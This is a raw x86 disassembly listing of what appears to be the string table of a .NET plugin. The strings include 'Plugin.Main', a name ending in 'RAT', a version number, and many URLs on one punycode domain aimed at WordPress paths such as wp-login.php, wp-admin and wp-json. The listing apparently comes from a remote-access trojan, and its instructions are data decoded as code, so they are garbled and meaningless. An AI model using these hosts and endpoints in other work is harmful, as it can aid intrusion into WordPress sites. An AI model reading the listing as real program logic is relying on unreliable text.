  40ae82:	69 6c 79 00 53 65 6c 	imul   $0x656c6553,0x0(%ecx,%edi,2),%ebp
  40ae89:	65 
  40ae8a:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  40ae8e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae8f:	79 00                	jns    0x40ae91
  40ae91:	42                   	inc    %edx
  40ae92:	6c                   	insb   (%dx),%es:(%edi)
  40ae93:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae94:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  40ae97:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae98:	70 79                	jo     0x40af13
  40ae9a:	00 67 65             	add    %ah,0x65(%edi)
  40ae9d:	74 5f                	je     0x40aefe
  40ae9f:	46                   	inc    %esi
  40aea0:	61                   	popa
  40aea1:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40aea5:	79 00                	jns    0x40aea7
  40aea7:	54                   	push   %esp
  40aea8:	61                   	popa
  40aea9:	73 6b                	jae    0x40af16
  40aeab:	46                   	inc    %esi
  40aeac:	61                   	popa
  40aead:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40aeb1:	79 00                	jns    0x40aeb3
  40aeb3:	43                   	inc    %ebx
  40aeb4:	72 65                	jb     0x40af1b
  40aeb6:	61                   	popa
  40aeb7:	74 65                	je     0x40af1e
  40aeb9:	44                   	inc    %esp
  40aeba:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40aec1:	79 00                	jns    0x40aec3
  40aec3:	67 65 74 5f          	addr16 gs je 0x40af26
  40aec7:	53                   	push   %ebx
  40aec8:	79 73                	jns    0x40af3d
  40aeca:	74 65                	je     0x40af31
  40aecc:	6d                   	insl   (%dx),%es:(%edi)
  40aecd:	44                   	inc    %esp
  40aece:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40aed5:	79 00                	jns    0x40aed7
  40aed7:	47                   	inc    %edi
  40aed8:	65 74 43             	gs je  0x40af1e
  40aedb:	75 72                	jne    0x40af4f
  40aedd:	72 65                	jb     0x40af44
  40aedf:	6e                   	outsb  %ds:(%esi),(%dx)
  40aee0:	74 44                	je     0x40af26
  40aee2:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40aee9:	79 00                	jns    0x40aeeb
  40aeeb:	6f                   	outsl  %ds:(%esi),(%dx)
  40aeec:	70 5f                	jo     0x40af4d
  40aeee:	45                   	inc    %ebp
  40aeef:	71 75                	jno    0x40af66
  40aef1:	61                   	popa
  40aef2:	6c                   	insb   (%dx),%es:(%edi)
  40aef3:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40aefa:	49 
  40aefb:	6e                   	outsb  %ds:(%esi),(%dx)
  40aefc:	65 71 75             	gs jno 0x40af74
  40aeff:	61                   	popa
  40af00:	6c                   	insb   (%dx),%es:(%edi)
  40af01:	69 74 79 00 43 6c 61 	imul   $0x69616c43,0x0(%ecx,%edi,2),%esi
  40af08:	69 
  40af09:	6d                   	insl   (%dx),%es:(%edi)
  40af0a:	73 49                	jae    0x40af55
  40af0c:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40af0f:	74 69                	je     0x40af7a
  40af11:	74 79                	je     0x40af8c
  40af13:	00 57 69             	add    %dl,0x69(%edi)
  40af16:	6e                   	outsb  %ds:(%esi),(%dx)
  40af17:	64 6f                	outsl  %fs:(%esi),(%dx)
  40af19:	77 73                	ja     0x40af8e
  40af1b:	49                   	dec    %ecx
  40af1c:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40af1f:	74 69                	je     0x40af8a
  40af21:	74 79                	je     0x40af9c
  40af23:	00 45 6d             	add    %al,0x6d(%ebp)
  40af26:	70 74                	jo     0x40af9c
  40af28:	79 00                	jns    0x40af2a
  40af2a:	00 00                	add    %al,(%eax)
  40af2c:	00 17                	add    %dl,(%edi)
  40af2e:	50                   	push   %eax
  40af2f:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40af33:	00 67 00             	add    %ah,0x0(%edi)
  40af36:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40af3c:	4d                   	dec    %ebp
  40af3d:	00 61 00             	add    %ah,0x0(%ecx)
  40af40:	69 00 6e 00 00 0b    	imul   $0xb00006e,(%eax),%eax
  40af46:	65 00 64 00 52       	add    %ah,%gs:0x52(%eax,%eax,1)
  40af4b:	00 41 00             	add    %al,0x0(%ecx)
  40af4e:	54                   	push   %esp
  40af4f:	00 00                	add    %al,(%eax)
  40af51:	07                   	pop    %es
  40af52:	52                   	push   %edx
  40af53:	00 75 00             	add    %dh,0x0(%ebp)
  40af56:	6e                   	outsb  %ds:(%esi),(%dx)
  40af57:	00 00                	add    %al,(%eax)
  40af59:	43                   	inc    %ebx
  40af5a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40af5e:	72 00                	jb     0x40af60
  40af60:	6f                   	outsl  %ds:(%esi),(%dx)
  40af61:	00 72 00             	add    %dh,0x0(%edx)
  40af64:	20 00                	and    %al,(%eax)
  40af66:	77 00                	ja     0x40af68
  40af68:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  40af6e:	20 00                	and    %al,(%eax)
  40af70:	73 00                	jae    0x40af72
  40af72:	75 00                	jne    0x40af74
  40af74:	62 00                	bound  %eax,(%eax)
  40af76:	6e                   	outsb  %ds:(%esi),(%dx)
  40af77:	00 6f 00             	add    %ch,0x0(%edi)
  40af7a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40af7e:	2c 00                	sub    $0x0,%al
  40af80:	20 00                	and    %al,(%eax)
  40af82:	73 00                	jae    0x40af84
  40af84:	75 00                	jne    0x40af86
  40af86:	62 00                	bound  %eax,(%eax)
  40af88:	6e                   	outsb  %ds:(%esi),(%dx)
  40af89:	00 6f 00             	add    %ch,0x0(%edi)
  40af8c:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40af90:	20 00                	and    %al,(%eax)
  40af92:	74 00                	je     0x40af94
  40af94:	79 00                	jns    0x40af96
  40af96:	70 00                	jo     0x40af98
  40af98:	65 00 3d 00 00 0b 31 	add    %bh,%gs:0x310b0000
  40af9f:	00 2e                	add    %ch,(%esi)
  40afa1:	00 38                	add    %bh,(%eax)
  40afa3:	00 2e                	add    %ch,(%esi)
  40afa5:	00 37                	add    %dh,(%edi)
  40afa7:	00 00                	add    %al,(%eax)
  40afa9:	03 0a                	add    (%edx),%ecx
  40afab:	00 00                	add    %al,(%eax)
  40afad:	09 64 00 61          	or     %esp,0x61(%eax,%eax,1)
  40afb1:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40afb5:	00 00                	add    %al,(%eax)
  40afb7:	2b 64 00 61          	sub    0x61(%eax,%eax,1),%esp
  40afbb:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40afbf:	00 20                	add    %ah,(%eax)
  40afc1:	00 63 00             	add    %ah,0x0(%ebx)
  40afc4:	61                   	popa
  40afc5:	00 6e 00             	add    %ch,0x0(%esi)
  40afc8:	20 00                	and    %al,(%eax)
  40afca:	6e                   	outsb  %ds:(%esi),(%dx)
  40afcb:	00 6f 00             	add    %ch,0x0(%edi)
  40afce:	74 00                	je     0x40afd0
  40afd0:	20 00                	and    %al,(%eax)
  40afd2:	62 00                	bound  %eax,(%eax)
  40afd4:	65 00 20             	add    %ah,%gs:(%eax)
  40afd7:	00 6e 00             	add    %ch,0x0(%esi)
  40afda:	75 00                	jne    0x40afdc
  40afdc:	6c                   	insb   (%dx),%es:(%edi)
  40afdd:	00 6c 00 21          	add    %ch,0x21(%eax,%eax,1)
  40afe1:	00 00                	add    %al,(%eax)
  40afe3:	31 68 00             	xor    %ebp,0x0(%eax)
  40afe6:	74 00                	je     0x40afe8
  40afe8:	74 00                	je     0x40afea
  40afea:	70 00                	jo     0x40afec
  40afec:	3a 00                	cmp    (%eax),%al
  40afee:	2f                   	das
  40afef:	00 2f                	add    %ch,(%edi)
  40aff1:	00 78 00             	add    %bh,0x0(%eax)
  40aff4:	6e                   	outsb  %ds:(%esi),(%dx)
  40aff5:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40affb:	00 75 00             	add    %dh,0x0(%ebp)
  40affe:	74 00                	je     0x40b000
  40b000:	6e                   	outsb  %ds:(%esi),(%dx)
  40b001:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b004:	61                   	popa
  40b005:	00 2e                	add    %ch,(%esi)
  40b007:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b00b:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b00f:	00 79 00             	add    %bh,0x0(%ecx)
  40b012:	2f                   	das
  40b013:	00 01                	add    %al,(%ecx)
  40b015:	43                   	inc    %ebx
  40b016:	68 00 74 00 74       	push   $0x74007400
  40b01b:	00 70 00             	add    %dh,0x0(%eax)
  40b01e:	3a 00                	cmp    (%eax),%al
  40b020:	2f                   	das
  40b021:	00 2f                	add    %ch,(%edi)
  40b023:	00 78 00             	add    %bh,0x0(%eax)
  40b026:	6e                   	outsb  %ds:(%esi),(%dx)
  40b027:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b02d:	00 75 00             	add    %dh,0x0(%ebp)
  40b030:	74 00                	je     0x40b032
  40b032:	6e                   	outsb  %ds:(%esi),(%dx)
  40b033:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b036:	61                   	popa
  40b037:	00 2e                	add    %ch,(%esi)
  40b039:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b03d:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b041:	00 79 00             	add    %bh,0x0(%ecx)
  40b044:	2f                   	das
  40b045:	00 69 00             	add    %ch,0x0(%ecx)
  40b048:	6e                   	outsb  %ds:(%esi),(%dx)
  40b049:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b04d:	00 78 00             	add    %bh,0x0(%eax)
  40b050:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40b054:	68 00 70 00 01       	push   $0x1007000
  40b059:	43                   	inc    %ebx
  40b05a:	68 00 74 00 74       	push   $0x74007400
  40b05f:	00 70 00             	add    %dh,0x0(%eax)
  40b062:	3a 00                	cmp    (%eax),%al
  40b064:	2f                   	das
  40b065:	00 2f                	add    %ch,(%edi)
  40b067:	00 78 00             	add    %bh,0x0(%eax)
  40b06a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b06b:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b071:	00 75 00             	add    %dh,0x0(%ebp)
  40b074:	74 00                	je     0x40b076
  40b076:	6e                   	outsb  %ds:(%esi),(%dx)
  40b077:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b07a:	61                   	popa
  40b07b:	00 2e                	add    %ch,(%esi)
  40b07d:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b081:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b085:	00 79 00             	add    %bh,0x0(%ecx)
  40b088:	2f                   	das
  40b089:	00 77 00             	add    %dh,0x0(%edi)
  40b08c:	70 00                	jo     0x40b08e
  40b08e:	2d 00 61 00 64       	sub    $0x64006100,%eax
  40b093:	00 6d 00             	add    %ch,0x0(%ebp)
  40b096:	69 00 6e 00 2f 00    	imul   $0x2f006e,(%eax),%eax
  40b09c:	01 41 68             	add    %eax,0x68(%ecx)
  40b09f:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b0a3:	00 70 00             	add    %dh,0x0(%eax)
  40b0a6:	3a 00                	cmp    (%eax),%al
  40b0a8:	2f                   	das
  40b0a9:	00 2f                	add    %ch,(%edi)
  40b0ab:	00 78 00             	add    %bh,0x0(%eax)
  40b0ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0af:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b0b5:	00 75 00             	add    %dh,0x0(%ebp)
  40b0b8:	74 00                	je     0x40b0ba
  40b0ba:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0bb:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b0be:	61                   	popa
  40b0bf:	00 2e                	add    %ch,(%esi)
  40b0c1:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b0c5:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b0c9:	00 79 00             	add    %bh,0x0(%ecx)
  40b0cc:	2f                   	das
  40b0cd:	00 77 00             	add    %dh,0x0(%edi)
  40b0d0:	70 00                	jo     0x40b0d2
  40b0d2:	2d 00 6a 00 73       	sub    $0x73006a00,%eax
  40b0d7:	00 6f 00             	add    %ch,0x0(%edi)
  40b0da:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0db:	00 2f                	add    %ch,(%edi)
  40b0dd:	00 01                	add    %al,(%ecx)
  40b0df:	49                   	dec    %ecx
  40b0e0:	68 00 74 00 74       	push   $0x74007400
  40b0e5:	00 70 00             	add    %dh,0x0(%eax)
  40b0e8:	3a 00                	cmp    (%eax),%al
  40b0ea:	2f                   	das
  40b0eb:	00 2f                	add    %ch,(%edi)
  40b0ed:	00 78 00             	add    %bh,0x0(%eax)
  40b0f0:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0f1:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b0f7:	00 75 00             	add    %dh,0x0(%ebp)
  40b0fa:	74 00                	je     0x40b0fc
  40b0fc:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0fd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b100:	61                   	popa
  40b101:	00 2e                	add    %ch,(%esi)
  40b103:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b107:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b10b:	00 79 00             	add    %bh,0x0(%ecx)
  40b10e:	2f                   	das
  40b10f:	00 77 00             	add    %dh,0x0(%edi)
  40b112:	70 00                	jo     0x40b114
  40b114:	2d 00 6c 00 6f       	sub    $0x6f006c00,%eax
  40b119:	00 67 00             	add    %ah,0x0(%edi)
  40b11c:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40b122:	70 00                	jo     0x40b124
  40b124:	68 00 70 00 01       	push   $0x1007000
  40b129:	39 68 00             	cmp    %ebp,0x0(%eax)
  40b12c:	74 00                	je     0x40b12e
  40b12e:	74 00                	je     0x40b130
  40b130:	70 00                	jo     0x40b132
  40b132:	3a 00                	cmp    (%eax),%al
  40b134:	2f                   	das
  40b135:	00 2f                	add    %ch,(%edi)
  40b137:	00 77 00             	add    %dh,0x0(%edi)
  40b13a:	77 00                	ja     0x40b13c
  40b13c:	77 00                	ja     0x40b13e
  40b13e:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b142:	6e                   	outsb  %ds:(%esi),(%dx)
  40b143:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b149:	00 75 00             	add    %dh,0x0(%ebp)
  40b14c:	74 00                	je     0x40b14e
  40b14e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b14f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b152:	61                   	popa
  40b153:	00 2e                	add    %ch,(%esi)
  40b155:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b159:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b15d:	00 79 00             	add    %bh,0x0(%ecx)
  40b160:	2f                   	das
  40b161:	00 01                	add    %al,(%ecx)
  40b163:	4b                   	dec    %ebx
  40b164:	68 00 74 00 74       	push   $0x74007400
  40b169:	00 70 00             	add    %dh,0x0(%eax)
  40b16c:	3a 00                	cmp    (%eax),%al
  40b16e:	2f                   	das
  40b16f:	00 2f                	add    %ch,(%edi)
  40b171:	00 77 00             	add    %dh,0x0(%edi)
  40b174:	77 00                	ja     0x40b176
  40b176:	77 00                	ja     0x40b178
  40b178:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b17c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b17d:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b183:	00 75 00             	add    %dh,0x0(%ebp)
  40b186:	74 00                	je     0x40b188
  40b188:	6e                   	outsb  %ds:(%esi),(%dx)
  40b189:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b18c:	61                   	popa
  40b18d:	00 2e                	add    %ch,(%esi)
  40b18f:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b193:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b197:	00 79 00             	add    %bh,0x0(%ecx)
  40b19a:	2f                   	das
  40b19b:	00 69 00             	add    %ch,0x0(%ecx)
  40b19e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b19f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b1a3:	00 78 00             	add    %bh,0x0(%eax)
  40b1a6:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40b1aa:	68 00 70 00 01       	push   $0x1007000
  40b1af:	4b                   	dec    %ebx
  40b1b0:	68 00 74 00 74       	push   $0x74007400
  40b1b5:	00 70 00             	add    %dh,0x0(%eax)
  40b1b8:	3a 00                	cmp    (%eax),%al
  40b1ba:	2f                   	das
  40b1bb:	00 2f                	add    %ch,(%edi)
  40b1bd:	00 77 00             	add    %dh,0x0(%edi)
  40b1c0:	77 00                	ja     0x40b1c2
  40b1c2:	77 00                	ja     0x40b1c4
  40b1c4:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b1c8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1c9:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b1cf:	00 75 00             	add    %dh,0x0(%ebp)
  40b1d2:	74 00                	je     0x40b1d4
  40b1d4:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1d5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b1d8:	61                   	popa
  40b1d9:	00 2e                	add    %ch,(%esi)
  40b1db:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b1df:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b1e3:	00 79 00             	add    %bh,0x0(%ecx)
  40b1e6:	2f                   	das
  40b1e7:	00 77 00             	add    %dh,0x0(%edi)
  40b1ea:	70 00                	jo     0x40b1ec
  40b1ec:	2d 00 61 00 64       	sub    $0x64006100,%eax
  40b1f1:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1f4:	69 00 6e 00 2f 00    	imul   $0x2f006e,(%eax),%eax
  40b1fa:	01 49 68             	add    %ecx,0x68(%ecx)
  40b1fd:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b201:	00 70 00             	add    %dh,0x0(%eax)
  40b204:	3a 00                	cmp    (%eax),%al
  40b206:	2f                   	das
  40b207:	00 2f                	add    %ch,(%edi)
  40b209:	00 77 00             	add    %dh,0x0(%edi)
  40b20c:	77 00                	ja     0x40b20e
  40b20e:	77 00                	ja     0x40b210
  40b210:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b214:	6e                   	outsb  %ds:(%esi),(%dx)
  40b215:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b21b:	00 75 00             	add    %dh,0x0(%ebp)
  40b21e:	74 00                	je     0x40b220
  40b220:	6e                   	outsb  %ds:(%esi),(%dx)
  40b221:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b224:	61                   	popa
  40b225:	00 2e                	add    %ch,(%esi)
  40b227:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b22b:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b22f:	00 79 00             	add    %bh,0x0(%ecx)
  40b232:	2f                   	das
  40b233:	00 77 00             	add    %dh,0x0(%edi)
  40b236:	70 00                	jo     0x40b238
  40b238:	2d 00 6a 00 73       	sub    $0x73006a00,%eax
  40b23d:	00 6f 00             	add    %ch,0x0(%edi)
  40b240:	6e                   	outsb  %ds:(%esi),(%dx)
  40b241:	00 2f                	add    %ch,(%edi)
  40b243:	00 01                	add    %al,(%ecx)
  40b245:	51                   	push   %ecx
  40b246:	68 00 74 00 74       	push   $0x74007400
  40b24b:	00 70 00             	add    %dh,0x0(%eax)
  40b24e:	3a 00                	cmp    (%eax),%al
  40b250:	2f                   	das
  40b251:	00 2f                	add    %ch,(%edi)
  40b253:	00 77 00             	add    %dh,0x0(%edi)
  40b256:	77 00                	ja     0x40b258
  40b258:	77 00                	ja     0x40b25a
  40b25a:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b25e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b25f:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b265:	00 75 00             	add    %dh,0x0(%ebp)
  40b268:	74 00                	je     0x40b26a
  40b26a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b26b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b26e:	61                   	popa
  40b26f:	00 2e                	add    %ch,(%esi)
  40b271:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b275:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b279:	00 79 00             	add    %bh,0x0(%ecx)
  40b27c:	2f                   	das
  40b27d:	00 77 00             	add    %dh,0x0(%edi)
  40b280:	70 00                	jo     0x40b282
  40b282:	2d 00 6c 00 6f       	sub    $0x6f006c00,%eax
  40b287:	00 67 00             	add    %ah,0x0(%edi)
  40b28a:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40b290:	70 00                	jo     0x40b292
  40b292:	68 00 70 00 01       	push   $0x1007000
  40b297:	33 68 00             	xor    0x0(%eax),%ebp
  40b29a:	74 00                	je     0x40b29c
  40b29c:	74 00                	je     0x40b29e
  40b29e:	70 00                	jo     0x40b2a0
  40b2a0:	73 00                	jae    0x40b2a2
  40b2a2:	3a 00                	cmp    (%eax),%al
  40b2a4:	2f                   	das
  40b2a5:	00 2f                	add    %ch,(%edi)
  40b2a7:	00 78 00             	add    %bh,0x0(%eax)
  40b2aa:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2ab:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b2b1:	00 75 00             	add    %dh,0x0(%ebp)
  40b2b4:	74 00                	je     0x40b2b6
  40b2b6:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2b7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2ba:	61                   	popa
  40b2bb:	00 2e                	add    %ch,(%esi)
  40b2bd:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b2c1:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b2c5:	00 79 00             	add    %bh,0x0(%ecx)
  40b2c8:	2f                   	das
  40b2c9:	00 01                	add    %al,(%ecx)
  40b2cb:	45                   	inc    %ebp
  40b2cc:	68 00 74 00 74       	push   $0x74007400
  40b2d1:	00 70 00             	add    %dh,0x0(%eax)
  40b2d4:	73 00                	jae    0x40b2d6
  40b2d6:	3a 00                	cmp    (%eax),%al
  40b2d8:	2f                   	das
  40b2d9:	00 2f                	add    %ch,(%edi)
  40b2db:	00 78 00             	add    %bh,0x0(%eax)
  40b2de:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2df:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b2e5:	00 75 00             	add    %dh,0x0(%ebp)
  40b2e8:	74 00                	je     0x40b2ea
  40b2ea:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2eb:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2ee:	61                   	popa
  40b2ef:	00 2e                	add    %ch,(%esi)
  40b2f1:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b2f5:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b2f9:	00 79 00             	add    %bh,0x0(%ecx)
  40b2fc:	2f                   	das
  40b2fd:	00 69 00             	add    %ch,0x0(%ecx)
  40b300:	6e                   	outsb  %ds:(%esi),(%dx)
  40b301:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b305:	00 78 00             	add    %bh,0x0(%eax)
  40b308:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40b30c:	68 00 70 00 01       	push   $0x1007000
  40b311:	45                   	inc    %ebp
  40b312:	68 00 74 00 74       	push   $0x74007400
  40b317:	00 70 00             	add    %dh,0x0(%eax)
  40b31a:	73 00                	jae    0x40b31c
  40b31c:	3a 00                	cmp    (%eax),%al
  40b31e:	2f                   	das
  40b31f:	00 2f                	add    %ch,(%edi)
  40b321:	00 78 00             	add    %bh,0x0(%eax)
  40b324:	6e                   	outsb  %ds:(%esi),(%dx)
  40b325:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b32b:	00 75 00             	add    %dh,0x0(%ebp)
  40b32e:	74 00                	je     0x40b330
  40b330:	6e                   	outsb  %ds:(%esi),(%dx)
  40b331:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b334:	61                   	popa
  40b335:	00 2e                	add    %ch,(%esi)
  40b337:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b33b:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b33f:	00 79 00             	add    %bh,0x0(%ecx)
  40b342:	2f                   	das
  40b343:	00 77 00             	add    %dh,0x0(%edi)
  40b346:	70 00                	jo     0x40b348
  40b348:	2d 00 61 00 64       	sub    $0x64006100,%eax
  40b34d:	00 6d 00             	add    %ch,0x0(%ebp)
  40b350:	69 00 6e 00 2f 00    	imul   $0x2f006e,(%eax),%eax
  40b356:	01 43 68             	add    %eax,0x68(%ebx)
  40b359:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b35d:	00 70 00             	add    %dh,0x0(%eax)
  40b360:	73 00                	jae    0x40b362
  40b362:	3a 00                	cmp    (%eax),%al
  40b364:	2f                   	das
  40b365:	00 2f                	add    %ch,(%edi)
  40b367:	00 78 00             	add    %bh,0x0(%eax)
  40b36a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b36b:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b371:	00 75 00             	add    %dh,0x0(%ebp)
  40b374:	74 00                	je     0x40b376
  40b376:	6e                   	outsb  %ds:(%esi),(%dx)
  40b377:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b37a:	61                   	popa
  40b37b:	00 2e                	add    %ch,(%esi)
  40b37d:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b381:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b385:	00 79 00             	add    %bh,0x0(%ecx)
  40b388:	2f                   	das
  40b389:	00 77 00             	add    %dh,0x0(%edi)
  40b38c:	70 00                	jo     0x40b38e
  40b38e:	2d 00 6a 00 73       	sub    $0x73006a00,%eax
  40b393:	00 6f 00             	add    %ch,0x0(%edi)
  40b396:	6e                   	outsb  %ds:(%esi),(%dx)
  40b397:	00 2f                	add    %ch,(%edi)
  40b399:	00 01                	add    %al,(%ecx)
  40b39b:	4b                   	dec    %ebx
  40b39c:	68 00 74 00 74       	push   $0x74007400
  40b3a1:	00 70 00             	add    %dh,0x0(%eax)
  40b3a4:	73 00                	jae    0x40b3a6
  40b3a6:	3a 00                	cmp    (%eax),%al
  40b3a8:	2f                   	das
  40b3a9:	00 2f                	add    %ch,(%edi)
  40b3ab:	00 78 00             	add    %bh,0x0(%eax)
  40b3ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3af:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b3b5:	00 75 00             	add    %dh,0x0(%ebp)
  40b3b8:	74 00                	je     0x40b3ba
  40b3ba:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3bb:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b3be:	61                   	popa
  40b3bf:	00 2e                	add    %ch,(%esi)
  40b3c1:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b3c5:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b3c9:	00 79 00             	add    %bh,0x0(%ecx)
  40b3cc:	2f                   	das
  40b3cd:	00 77 00             	add    %dh,0x0(%edi)
  40b3d0:	70 00                	jo     0x40b3d2
  40b3d2:	2d 00 6c 00 6f       	sub    $0x6f006c00,%eax
  40b3d7:	00 67 00             	add    %ah,0x0(%edi)
  40b3da:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40b3e0:	70 00                	jo     0x40b3e2
  40b3e2:	68 00 70 00 01       	push   $0x1007000
  40b3e7:	80 cf 68             	or     $0x68,%bh
  40b3ea:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b3ee:	00 70 00             	add    %dh,0x0(%eax)
  40b3f1:	73 00                	jae    0x40b3f3
  40b3f3:	3a 00                	cmp    (%eax),%al
  40b3f5:	2f                   	das
  40b3f6:	00 2f                	add    %ch,(%edi)
  40b3f8:	00 78 00             	add    %bh,0x0(%eax)
  40b3fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3fc:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b402:	00 75 00             	add    %dh,0x0(%ebp)
  40b405:	74 00                	je     0x40b407
  40b407:	6e                   	outsb  %ds:(%esi),(%dx)
  40b408:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b40b:	61                   	popa
  40b40c:	00 2e                	add    %ch,(%esi)
  40b40e:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b412:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b416:	00 79 00             	add    %bh,0x0(%ecx)
  40b419:	2f                   	das
